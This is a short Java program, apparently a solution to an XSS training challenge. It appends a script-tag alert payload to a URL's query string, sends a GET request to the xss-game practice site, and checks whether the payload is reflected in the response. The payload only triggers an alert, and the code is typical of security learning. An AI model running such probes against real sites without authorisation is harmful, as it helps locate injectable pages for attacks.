package challenge;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class alertAttackGet {
	
	public static boolean getAlert(String urlString) throws Exception{
		URL url = new URL(urlString);
		String alertScript = "<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>";
		String attack = "/?query=\"<" + alertScript;
		String newUrl = url.toString() + attack;
		httpResponse response = sendGet(newUrl);
		int isAttack = response.getResponse().indexOf(alertScript);
		return 	isAttack!=-1 && response.getResponseCode()==200;
	}
	
	private static httpResponse sendGet(String urlString) throws Exception {
		
		URL url = new URL(urlString);
		HttpURLConnection con = (HttpURLConnection) url.openConnection();

		con.setRequestMethod("GET");

		int responseCode = con.getResponseCode();
		System.out.println("\nSending 'GET' request to URL : " + urlString);
		System.out.println("Response Code : " + responseCode);

		BufferedReader in = new BufferedReader(
		        new InputStreamReader(con.getInputStream()));
		String inputLine;
		StringBuffer response = new StringBuffer();

		while ((inputLine = in.readLine()) != null) {
			response.append(inputLine);
		}
		in.close();
		
		System.out.println(response.toString());
		return new httpResponse(responseCode, response);
	}
	
	public static void main(String[] args) throws Exception {
		boolean ret = getAlert("https://xss-game.appspot.com/level1/frame");
		System.out.println(ret);
	}

	private static class httpResponse{
		int responseCode;
		StringBuffer response;
		
		public httpResponse(int responseCode, StringBuffer response) {
			this.responseCode=responseCode;
			this.response=response;
		}

		public int getResponseCode() {
			return responseCode;
		}
	
		public StringBuffer getResponse() {
			return response;
		}
	}
	
}

